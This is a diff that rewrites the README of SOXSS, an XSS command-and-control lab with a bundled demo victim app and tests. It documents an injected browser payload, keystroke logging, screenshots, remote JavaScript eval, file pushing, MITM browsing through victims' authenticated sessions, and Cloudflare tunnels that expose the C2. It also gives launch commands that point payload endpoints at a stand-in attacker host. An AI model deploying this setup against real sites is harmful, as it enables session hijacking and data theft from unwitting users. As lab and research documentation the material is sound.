@@ -1,92 +1,174 @@
 # SOXSS
-Advanced XSS Command and Control (C2) with WebSockets, Per-Session Encryption, and Premium Management Console.
+
+SOXSS is an XSS command-and-control lab that serves an injectable browser payload, maintains one encrypted WebSocket channel per victim session, and exposes a local web console for operator control. The repository also includes a realistic demo target, `twister/`, plus unit and Selenium coverage for the main runtime paths.
+
+## What The Project Includes
+
+- `Socxss.py`: starts the payload HTTP server, the WebSocket C2 server, and the local console server.
+- `server/`: serves `webSocket.js` and related client-side scripts, injecting per-session crypto material and public endpoint settings on demand.
+- `modules/`: screenshot, logger, MITM, console, and related message handlers.
+- `console/`: browser UI for listing victims, selecting a target, issuing commands, and viewing output.
+- `twister/`: demo social application used for local testing and XSS exercises.
+- `tests/`: fast unit tests plus Selenium end-to-end tests.
 
 ## Requirements
-* Python 3.10 or higher
-* Recommended: `pip install -r requirements.txt` (includes `aiohttp`, `pycryptodomex`, `websockets`, `Pillow`)
 
-## Installation
+- Python 3.10+
+- A virtual environment is recommended
+- `pip install -r requirements.txt`
 
-1. Clone the repository: `git clone https://github.com/ctpache/SOXSS.git`
-2. Install the requirements: `pip install -r requirements.txt`
-3. Configure your network settings in `config.py`.
-4. Run the server: `python Socxss.py [-f] [-q]`
-   - `-f`: Fresh start (cleans console logs and screenshots).
-   - `-q`: Quiet mode (hides the banner).
+Current Python dependencies in `requirements.txt` are:
+
+- `websockets`
+- `pillow`
+- `pycryptodome`
+- `aiohttp`
+- `requests`
+- `selenium`
+- `coverage`
+
+## Quick Start
+
+1. Create and activate a virtual environment.
+2. Install dependencies.
+3. Adjust `config.py` if the default ports or public hosts are not suitable.
+4. Start SOXSS.
+
+Example:
+
+```powershell
+py -3 -m venv .venv
+.\.venv\Scripts\Activate.ps1
+python -m pip install -r requirements.txt
+python .\Socxss.py
+```
+
+Default local endpoints:
+
+- Payload server: `http://0.0.0.0:8000/`
+- WebSocket C2: `ws://0.0.0.0:8765/<sid>`
+- Console: `http://127.0.0.1:8002/index.html`
+- MITM proxy base: `http://localhost:8001/<sid>/`
+
+Useful runtime flags:
+
+- `-f`, `--fresh-start`: remove files under `console/screenshots/` and `console/logs/` before startup.
+- `-q`, `--quiet`: suppress the startup banner.
+
+## Runtime Configuration
+
+All default network settings live in `config.py`:
+
+- `HTTP_HOST`, `HTTP_PORT`: payload/script server
+- `WS_HOST`, `WS_PORT`: WebSocket C2 listener
+- `CONSOLE_HOST`, `CONSOLE_PORT`: local operator console
+- `MITM_HOST`, `MITM_PORT`: per-session MITM proxy base
+- `PUBLIC_HTTP_*`, `PUBLIC_WS_*`: externally visible host, scheme, and optional port used when generating the injected payload
+
+In addition to editing `config.py`, SOXSS can override any uppercase config value directly from the command line at startup. Both standard and colon forms are accepted.
+
+Examples:
+
+```powershell
+python .\Socxss.py --HTTP_HOST 127.0.0.1 --HTTP_PORT 9000
+python .\Socxss.py --PUBLIC_HTTP_HOST attacker.example --PUBLIC_WS_HOST attacker.example
+python .\Socxss.py --PUBLIC_HTTP_SCHEME https --PUBLIC_WS_SCHEME wss --PUBLIC_HTTP_PORT None --PUBLIC_WS_PORT None
+python .\Socxss.py --HTTP_HOST: 192.168.1.20 --WS_PORT:8765
+```
+
+## How It Works
+
+When a victim loads `server/webSocket.js`, the HTTP server generates a fresh session identifier (`sid`) and session-specific crypto material. That payload connects back to the configured WebSocket server, and incoming messages are routed to modules based on their `type` field.
+
+The main built-in behaviors are:
+
+- `screenshot`: captures browser screenshots and stores both latest and archived copies under `console/screenshots/`.
+- `log`: appends captured lines to `console/logs/<sid>.log`.
+- `mitm`: uses the victim browser as a session-bound proxy path.
+- `console`: forwards command results back into the local operator UI.
+
+The payload also ships helper scripts such as `link2fetch.js` so the injected session can survive same-origin navigation more reliably during demos.
+
+## Console Commands
+
+The current command registry is implemented in `modules/consoleCommands/`.
+
+- `list`: show connected sockets with metadata such as SID, IP, and MITM URL.
+- `change <index>`: switch the active target socket by list index.
+- `eval <expression>`: execute JavaScript in the current victim context.
+- `load <script>`: send inline JavaScript or a script-loading stub to the victim.
+- `screenshot`: request a screenshot from the active victim.
+- `downloadFile <local_path> <remote_name>`: send a local file to the victim, base64-encoded in the command payload.
+- `disable`: instruct the active victim to close the session.
+- `exit`: alias for `disable`.
+- `ok`: send a basic acknowledgement payload.
+
+The browser console UI also supports local-only clearing shortcuts such as `clear`, `cls`, and `Ctrl+L` without affecting the victim session.
+
+## Demo Target: Twister
+
+`twister/` is the bundled victim application used by the automated tests and local demonstrations. It is an `aiohttp` application with:
+
+- register/login/logout flows
+- server-side session handling
+- a paginated feed
+- per-user profile pages
+- JSON registry files under `twister/registry/`
+
+Run it locally with:
+
+```powershell
+python .\twister\server.py
+```
+
+By default it listens on `http://127.0.0.1:7070/` in the integrated Selenium workflow.
 
 ## Testing
-SOXSS includes both fast unit tests and browser-based Selenium E2E tests.
 
-Fast suite:
-```bash
+Fast unit suite:
+
+```powershell
 python -m unittest tests.test_runtime_unit tests.test_modules_unit tests.test_console_commands_unit tests.test_server_modules_unit tests.test_twister_server_unit -v
 ```
 
-Selenium E2E suite:
-```bash
+Browser-based Selenium suite:
+
+```powershell
 python -m unittest tests.selenium.test_soxss_selenium -v
 ```
 
-Coverage report for the fast suite:
-```bash
+Coverage for the fast suite:
+
+```powershell
 coverage run -m unittest tests.test_runtime_unit tests.test_modules_unit tests.test_console_commands_unit tests.test_server_modules_unit tests.test_twister_server_unit -v
 coverage report -m
 ```
 
-## Network Configuration (`config.py`)
-All network settings are centralized in `config.py`. You can independently configure:
-* **Payload Server**: Serves initial scripts and payloads (default port 8000).
-* **C2 WebSockets**: Secure communication channel for victims (default port 8765).
-* **Console Server**: Management panel, isolated to `127.0.0.1` by default for security (default port 8002).
-* **MITM Server**: Proxy for victim traffic (default port 8001).
+The integrated Selenium runner starts both SOXSS and Twister through `tests/selenium/run_soxss_victim_local.py`, injects a deterministic stored XSS into the demo feed, then validates `screenshot`, `logger`, `mitm`, and `downloadFile` behavior end to end.
 
-## Component Architecture
+## Cloudflare Tunnel Workflow
 
-### 1. The Server (`Socxss.py`)
-The heart of the C2. It manages:
-- **Per-Session Security**: Uses a unique Session ID (`sid`) and a dedicated AES-256 (CBC) key/IV pair for every connection.
-- **WebSocket Gateway**: High-performance async handling using `websockets.asyncio`.
-- **Module Routing**: Dispatches messages to specialized modules (Screenshot, Logger, MITM, etc.).
+The repository includes PowerShell helpers for exposing the lab with Cloudflare quick tunnels.
 
-### 2. Premium Management Console
-![console](/docs/Terminal_Web.png)
-Access it via `http://localhost:8002/` (default). 
-Features:
-- **Dark Glass UI**: Modern, premium aesthetic with real-time status tracking.
-- **Live Victim Sidebar**: Automatically polls and updates with new connections. Shows IP and SID.
-- **High-Precision Terminal**: Real-time feedback with timestamps and semantic color-coding.
-- **Visual Previews**: Live screenshot gallery for the active victim.
+- `scripts/deploy_cloudflare.ps1`: starts tunnels for the payload server and WebSocket endpoint, prints the public URLs, and can optionally launch SOXSS with matching `PUBLIC_*` CLI overrides.
+- `scripts/start_all_cloudflare.ps1`: prepares `.venv`, installs missing dependencies, starts `twister/server.py` on port `7070`, ensures `cloudflared` is available, and then calls the deploy script.
+- `scripts/stop_all.ps1`: stops SOXSS, Twister, and tunnel processes. Use `-IncludeNode` if you also want to stop Node-based helpers.
 
-### 3. The Payload (`server/webSocket.js`)
-Injected via XSS. It establishes a secure link to the C2.
-- **Dynamic Injection**: Payloads are auto-configured with the correct host/port from `config.py` upon request.
-- **Persistence**: Includes `link2fetch.js` which "poisons" DOM links to use `fetch` + History API, keeping the session alive during navigation.
+Examples:
 
-## Standard Commands
-* `list`: Display all active victim metadata.
-* `change <index>`: Switch control to a specific victim.
-* `load <script_or_url>`: Inject a remote script URL or inline JavaScript into the victim.
-* `screenshot`: Capture a real-time image of the victim's screen.
-* `downloadFile <local> <remote>`: Push a file to the victim.
-* `disable`: Close the selected victim WebSocket session.
-* `exit`: Alias of `disable` in the current implementation.
-* `eval <expression>`: Evaluate JavaScript in the victim context and return the result.
+```powershell
+.\scripts\deploy_cloudflare.ps1 -NoRun
+.\scripts\start_all_cloudflare.ps1 -FreshStart
+.\scripts\stop_all.ps1
+```
 
-UI shortcuts:
-- `clear` / `cls`: Clear terminal output in the browser UI only.
-- `Ctrl+L`: Clear terminal output in the browser UI.
+## Repository Notes
 
-## Data Management
-All session data is organized by `sid` for easy tracking:
-- **Screenshots**: Saved in `console/screenshots/{sid}.png` (latest) and `{sid}_{timestamp}.png` (archive).
-- **Logs**: Keystrokes and data captures saved in `console/logs/{sid}.log`.
+- Screenshots are created on demand in `console/screenshots/`.
+- Logger output is created on demand in `console/logs/`.
+- The console is intentionally bound to `127.0.0.1` by default; keep it local unless you add your own access controls.
+- The payload server injects session keys, IVs, and public endpoint data dynamically into `server/webSocket.js`; that file is not served as a static literal.
 
-## MITM Proxy
-The MITM module allows you to use the victim's browser as a transparent proxy. Open the per-session URL from the console (`mitmUrl`) or use:
+## Disclaimer
 
-`http://<MITM_HOST>:<MITM_PORT>/<sid>/`
-
-Then navigate from that tab to access victim-authenticated resources through the active session.
-
----
-*Disclaimer: This tool is for educational and authorized security testing purposes only.*
+This project is for authorized security research, controlled demonstrations, and educational use only.
